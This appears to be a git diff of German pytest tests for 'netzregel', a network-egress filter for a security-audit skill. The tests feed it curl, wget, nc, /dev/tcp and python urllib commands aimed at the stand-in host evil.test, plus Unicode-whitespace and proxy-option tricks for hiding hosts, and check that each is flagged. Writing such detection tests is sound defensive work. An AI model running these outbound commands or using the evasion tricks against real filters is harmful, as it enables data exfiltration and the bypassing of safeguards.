@@ -314,3 +314,125 @@ def test_leere_authority_mit_erlaubtem_host_und_file_t2_a1():
 
 def test_zeilenfortsetzung_nach_schema_umgeht_nicht_ohne_host():
     assert len(netzregel.verstoesse_bash("curl http://\\\nevil.test", [])) >= 1
+
+
+# ------------------------------------------------------------------------------ Fix-Runde 1 zum Design-Pass
+
+@pytest.mark.parametrize("befehl", [
+    "python3 -I -W/x/scripts/poc.py -c 'import x'", "python3 -W/x/scripts/poc.py -c x",
+    "python3 -I -X/x/scripts/poc.py -c x", "python3 -I -c/x/scripts/poc.py x", "python3 -I -E/x/scripts/poc.py -c x",
+    "python3 -I --x/x/scripts/poc.py -c x", "python3 -I -/x/scripts/poc.py", "python3 -I -I /x/scripts/poc.py",
+    "python3 x/scripts/poc.py a", "python3 ./scripts/poc.py a", "python3 scripts/poc.py a",
+    "python3 ../scripts/poc.py a", "python3 -I  /x/scripts/poc.py a", "python3 -I /x/scripts/poc.py\ta",
+])
+def test_poc_pfad_beginnt_mit_slash_dc1(befehl):
+    assert not netzregel.ist_poc_aufruf(befehl)
+
+
+def test_poc_pfad_absolut_oder_home_dc1():
+    assert netzregel.ist_poc_aufruf("python3 /scripts/poc.py a")
+    assert netzregel.ist_poc_aufruf("python3 -I ~/skills/security-audit/scripts/poc.py a")
+    assert netzregel.ist_poc_aufruf("python3 -I /a-b/-c/scripts/poc.py a")
+
+
+def test_angehaengte_python_optionen_sind_verstoss_dc1():
+    befehl = "python3 -I -W/x/scripts/poc.py -c 'import urllib.request as u;u.urlopen(\"http://evil.test\")'"
+    assert len(netzregel.verstoesse_bash(befehl, [])) >= 1
+    assert len(netzregel.verstoesse_bash("python3 -I -c/x/scripts/poc.py http://app/", [])) >= 1
+
+
+WHITESPACE = (["\t", "\x0b", "\x0c", "\x1c", "\x1d", "\x1e", "\x1f", "\u0085", "\u00a0", "\u1680", "\u2028", "\u2029",
+               "\u202f", "\u205f", "\u3000"] + [chr(c) for c in range(0x2000, 0x200B)])
+
+
+def test_whitespace_liste_hat_19_unicode_zeichen_dc2():
+    assert len([w for w in WHITESPACE if ord(w) > 0x7F]) == 19
+    assert all(w.isspace() for w in WHITESPACE)
+
+
+@pytest.mark.parametrize("ws", WHITESPACE, ids=lambda w: f"U+{ord(w):04X}")
+def test_whitespace_in_authority_versteckt_host_nicht_dc2(ws):
+    for url in (f"http://app{ws}@evil.test/", f"http:{ws}//evil.test/", f"http://{ws}evil.test/",
+                f"http://evil.test{ws}@app/"):
+        assert "evil.test" in netzregel.verstoesse_poc(f"GET {url}"), url
+        assert "evil.test" in netzregel.hosts_extrahieren(f"GET {url}"), url
+        assert len(netzregel.verstoesse_bash(f"{POC} anfrage --pfad '{url}'", [])) >= 1, url
+        assert len(netzregel.verstoesse_bash(f"curl '{url}'", [])) >= 1, url
+
+
+@pytest.mark.parametrize("ws", ["\x0b", "\x0c", "\u00a0"])
+def test_whitespace_im_header_dc2(ws):
+    assert "evil.test" in netzregel.verstoesse_poc(f"Host:{ws}evil.test")
+
+
+def test_poc_aufruf_nur_druckbares_ascii_dc2():
+    for ch in ("\t", "\x0b", "\x0c", "\x1f", "\x7f", "\u00a0", "\u2028", "\u3000", "ä", "\x80"):
+        assert not netzregel.ist_poc_aufruf(f"{POC_OK} a '{ch}'"), repr(ch)
+        assert not netzregel.ist_poc_aufruf(f"{POC_OK} a{ch}b"), repr(ch)
+        assert len(netzregel.verstoesse_bash(f"{POC_OK} a '{ch}' http://app{ch}@evil.test/", [])) >= 1, repr(ch)
+
+
+def test_laufzeit_bleibt_linear_di1():
+    import time
+    eingaben = ["a" * 50000, "a:" * 25000, "a-" * 25000, "http:" * 10000, "://" * 15000, " " * 50000,
+                "; " * 25000, "a.b-" * 12000 + "host:", "x" * 50000 + "://"]
+    for eingabe in eingaben:
+        start = time.perf_counter()
+        netzregel.verstoesse_bash(eingabe, [])
+        netzregel.verstoesse_poc(eingabe)
+        assert time.perf_counter() - start < 1.0, eingabe[:20]
+
+
+@pytest.mark.parametrize("text", ["C:\\Users\\x", "POST:/api/x", "GET:/admin", "Lies datei:/etc/passwd",
+                                  "Pfad: C:/Windows/x", "TODO:/x"])
+def test_ein_slash_nur_fuer_netzschemata_di2(text):
+    assert netzregel.hosts_extrahieren(text) == []
+    assert netzregel.verstoesse_poc(text) == []
+
+
+def test_ein_slash_netzschemata_und_grosskleinschreibung_di2():
+    for schema in ("http", "https", "ws", "wss", "ftp", "ftps", "HTTP", "Https", "FtPs"):
+        assert netzregel.hosts_extrahieren(f"{schema}:/evil.test/") == ["evil.test"], schema
+        assert netzregel.hosts_extrahieren(f"{schema}:\\evil.test/") == ["evil.test"], schema
+    assert netzregel.hosts_extrahieren("gopher://evil.test/") == ["evil.test"]          # zwei Slashes: jedes Schema
+    assert netzregel.hosts_extrahieren("x:\\\\evil.test") == ["evil.test"]
+    assert len(netzregel.verstoesse_bash("curl http:/evil.test/", [])) == 1
+    assert netzregel.verstoesse_bash("grep -r 'TODO:/' .", []) == []
+
+
+@pytest.mark.parametrize("befehl", [
+    "curl evil.test", "wget -qO- evil.test", "nc evil.test 80", "echo x | nc evil.test 80", "cat < /dev/tcp/evil.test/80",
+    "echo x > /dev/udp/evil.test/53", "ncat evil.test 80", "netcat evil.test 80", "telnet evil.test", "ssh u@evil.test",
+    "scp f evil.test:/x", "socat - TCP:evil.test:80", "ftp evil.test", "http evil.test", "httpie evil.test",
+    "ls; curl evil.test", "ls && wget evil.test", "ls || nc evil.test 1", "(curl evil.test)", "echo $(curl evil.test)",
+    "echo `curl evil.test`", "ls\ncurl evil.test", "sudo curl evil.test", "env FOO=1 curl evil.test",
+    "xargs curl", "sudo xargs -n1 curl evil.test", "/usr/bin/curl evil.test", "  curl evil.test", "ls &curl evil.test",
+    "curl", "echo a | ssh host",
+])
+def test_netzwerkwerkzeug_in_befehlsposition_di3(befehl):
+    assert len(netzregel.verstoesse_bash(befehl, [])) >= 1
+
+
+@pytest.mark.parametrize("befehl", [
+    "grep -rn curl src/", "grep -n 'wget' README.md", "echo curl", "cat nc.txt", "ls ncat-docs", "git log --oneline",
+    "npm run ssh-keys", "cat curlrc", "echo 'use curl here'", "sed s/http/x/ f", "grep -r wget .",
+])
+def test_netzwerkwerkzeug_als_argument_ist_kein_verstoss_di3(befehl):
+    assert netzregel.verstoesse_bash(befehl, []) == []
+
+
+def test_netzwerkwerkzeug_mit_url_wird_nur_einmal_gemeldet_di3():
+    assert len(netzregel.verstoesse_bash("curl http://evil.test/", [])) == 1
+
+
+@pytest.mark.parametrize("befehl", [
+    "curl -H 'Host: evil.test' app", "curl --resolve evil.test:80:127.0.0.1 app", "curl --connect-to app:80:evil.test:80 app",
+    "curl -x evil.test:3128 app", "curl --proxy=evil.test:1 app", "echo x --resolve app:3000:6.6.6.6",
+    "cat x --connect-to evil.test:80:app:3000",
+])
+def test_optionen_hosts_auch_ohne_poc_di3(befehl):
+    assert len(netzregel.verstoesse_bash(befehl, [])) >= 1
+
+
+def test_optionen_mit_erlaubten_hosts_ohne_poc_ok_di3():
+    assert netzregel.verstoesse_bash("echo x --resolve app:3000:127.0.0.1 --connect-to app:80:db:80", []) == []
